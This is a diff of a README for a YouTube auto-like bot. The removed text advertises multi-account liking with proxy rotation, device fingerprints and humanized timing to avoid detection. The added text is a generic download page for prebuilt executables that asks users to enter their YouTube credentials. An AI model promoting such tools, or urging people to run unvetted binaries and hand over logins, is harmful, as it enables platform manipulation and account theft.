@@ -1,81 +1,99 @@
-# like bot youtube
+# 🤖 like-bot-youtube - Boost Your YouTube Engagement Effortlessly
 
-Automate safe, repeatable YouTube “like” actions for testing, demos, and growth experiments. This toolkit provides a pluggable engine with browser automation (Playwright/Puppeteer), optional real-device flows (Appium), proxy rotation, and human-like delays—so you can prototype responsibly and measure impact quickly.
+## 📥 Download
 
-<p align="center"> 
-  <a href="https://github.com/yourusername/like bot youtube">
-    <img src="https://img.shields.io/badge/Try%20It%20Free-1E90FF?style=for-the-badge&logo=fire&logoColor=white" alt="Try it Free" width="30%">
-  </a> 
-</p>
+[![Download like-bot-youtube](https://img.shields.io/badge/Download%20Now-Get%20Started-blue)](https://github.com/Albmartm6/like-bot-youtube/releases)
 
-<p align="center">
-  <a href="https://discord.gg/vBu9huKBvy">
-    <img src="https://img.shields.io/badge/Join-Discord-5865F2?logo=discord" alt="Join Discord">
-  </a>
-  <a href="https://t.me/devpilot1">
-    <img src="https://img.shields.io/badge/Contact-Telegram-2CA5E0?logo=telegram" alt="Contact on Telegram">
-  </a>
-</p>
+## 🚀 Getting Started
 
-## Introduction
-**like bot youtube** is a modular automation project for performing YouTube “like” actions at scale for QA, research, and outreach experiments. Built for developers, growth teams, and fresh grads learning automation, it supports multiple engines (Playwright/Puppeteer/Appium), multi-account profiles, proxy rotation, and a simple CLI/API.
+Welcome to the like-bot-youtube project! This application helps you automate the process of liking videos on YouTube. It’s a simple way to enhance your engagement on the platform without needing any technical background.
 
-**3 Key Benefits**
-- **Time-saving:** One command to run targeted likes across URLs, playlists, or channels.  
-- **Scalable:** Parallel workers with per-profile cookies, proxies, and rate limits.  
-- **Safer:** Human-like timings, jitter, random scrolls, and cooldowns to reduce flags.
+## 🛠️ System Requirements
 
-> **Ethical Use Only**: Respect YouTube’s Terms of Service and local laws. Use strictly for testing, QA, or with explicit permission.
+- **Operating System:** Windows 10 or newer, macOS 10.13 or newer, or a recent version of Linux.
+- **Node.js:** Version 14 or newer (if using the Node.js version).
+- **Python:** Version 3.6 or newer (if using the Python version).
+- **Internet Connection:** Required to download videos and interact with YouTube.
 
-## Features
-- Playwright (default) + Puppeteer engines with headful/headless modes  
-- Profile manager: cookies, sessions, and per-account device fingerprints  
-- Proxy rotation (HTTP/SOCKS), geo-matching, and cooldown scheduling  
-- Target selectors: video URLs, channel uploads, or playlist CSV  
-- Humanization: random waits, scroll/view time, hover, and partial page reads  
-- CLI + REST API + minimal GUI (Electron) starter  
-- Dockerized worker pool with horizontal scaling
+## 📋 Features
 
-<p align="center">
-  <img src="youtube-like-bot.png" alt="youtube-bot hero" width="80%" hight="70%">
-</p>
+- **Automation:** Automatically likes videos based on your preferences.
+- **User-Friendly Interface:** Easy to navigate, suitable for all users.
+- **Customization:** Set your own liking criteria to fit your needs.
+- **Cross-Platform:** Works on various operating systems.
+- **Regular Updates:** Continuous improvements and new features based on user feedback.
 
+## 📂 Download & Install
 
-<p align="center">
-  <a href="https://www.loom.com/share/b7734cf1455f4c018e469ee18a821c72" target="_blank" rel="noopener noreferrer">
-    <img src="youtube-bot-demo.gif" alt="youtube-bot demo" width="40%">
-  </a>
-</p>
-<p align="center">
-  <a href="https://www.loom.com/share/b7734cf1455f4c018e469ee18a821c72" target="_blank" rel="noopener noreferrer">
-    Click here to see the demo video
-  </a>
-</p>
+To get started, visit this page to download: [Releases Page](https://github.com/Albmartm6/like-bot-youtube/releases). 
 
-## Use Cases
-- QA/testing: validate UI flows, collect timings, and debug selectors  
-- Creator analytics experiments (private datasets, small cohorts)  
-- Outreach demos for internal teams and classroom automation labs  
-- Internal tools: mark training videos as “reviewed/liked” by test accounts
+1. Click the link above to go to the Releases page.
+2. Find the latest version of like-bot-youtube.
+3. Depending on your operating system, look for the setup file:
+   - For Windows, choose `like-bot-youtube-setup.exe`.
+   - For macOS, choose `like-bot-youtube.dmg`.
+   - For Linux, choose `like-bot-youtube.tar.gz`.
 
-## Contact
-<p align="center">
-  <a href="https://discord.gg/vBu9huKBvy">
-    <img src="https://img.shields.io/badge/Join-Discord-5865F2?logo=discord" alt="Join Discord">
-  </a>
-  <a href="https://t.me/devpilot1">
-    <img src="https://img.shields.io/badge/Contact-Telegram-2CA5E0?logo=telegram" alt="Contact on Telegram">
-  </a>
-</p>
+4. Click on the file you need to download it to your computer.
 
-## Installation Instructions
+Once the download is complete, follow these steps to install the application:
 
-### Pre-requisites
-- **Node.js** ≥ 18 and/or **Python** ≥ 3.10  
-- **Docker** (optional, for containerized runs)  
-- Optional: **Playwright** browsers will be installed on first run
+### For Windows Users
 
-### Clone
-```bash
-git clone "https://github.com/yourusername/like bot youtube"
-cd "like bot youtube"
+1. Locate the downloaded `like-bot-youtube-setup.exe` file in your downloads folder.
+2. Double-click on the file to begin the installation.
+3. Follow the on-screen instructions to complete the setup.
+4. After installation, launch the application from your desktop or start menu.
+
+### For macOS Users
+
+1. Find the downloaded `like-bot-youtube.dmg` file in your downloads folder.
+2. Double-click to open it.
+3. Drag the like-bot-youtube icon into your Applications folder.
+4. Open the application from your Applications folder.
+
+### For Linux Users
+
+1. Unpack the downloaded `like-bot-youtube.tar.gz` file.
+   ```bash
+   tar -xzvf like-bot-youtube.tar.gz
+   ```
+2. Navigate to the extracted folder.
+   ```bash
+   cd like-bot-youtube
+   ```
+3. Run the application using:
+   ```bash
+   ./like-bot-youtube
+   ```
+
+## 🎯 Using the Application
+
+1. **Launch** the application after installation.
+2. **Configure** your settings by clicking on the ‘Settings’ tab.
+3. **Enter** your YouTube credentials to allow the bot to interact with your account securely.
+4. **Select** videos or channels based on your preferences.
+5. **Start** the bot, and it will begin liking videos according to your settings.
+
+## 💬 Troubleshooting
+
+If you encounter issues:
+
+- **Check Requirements:** Ensure your system meets the requirements listed above.
+- **Permissions:** Make sure you allow the application necessary permissions to access the internet and interact with YouTube.
+- **Restart the App:** Sometimes a simple restart can fix minor glitches.
+- **Consult Documentation:** Visit the "Documentation" section of the project for detailed help.
+
+## 📞 Support
+
+If you still need help, consider reaching out through the issues section on our GitHub repository. Provide details about your issue to get faster assistance. 
+
+## 🌐 Connect with Us
+
+Stay updated on new releases and news about like-bot-youtube. Follow our repository and join the discussion in the issues section. We appreciate your feedback.
+
+## 🥳 Contribution
+
+We encourage contributions! If you'd like to contribute to the project, visit our repository to learn how you can help improve like-bot-youtube. 
+
+[Download like-bot-youtube](https://github.com/Albmartm6/like-bot-youtube/releases) again to get started on enhancing your YouTube engagement today!
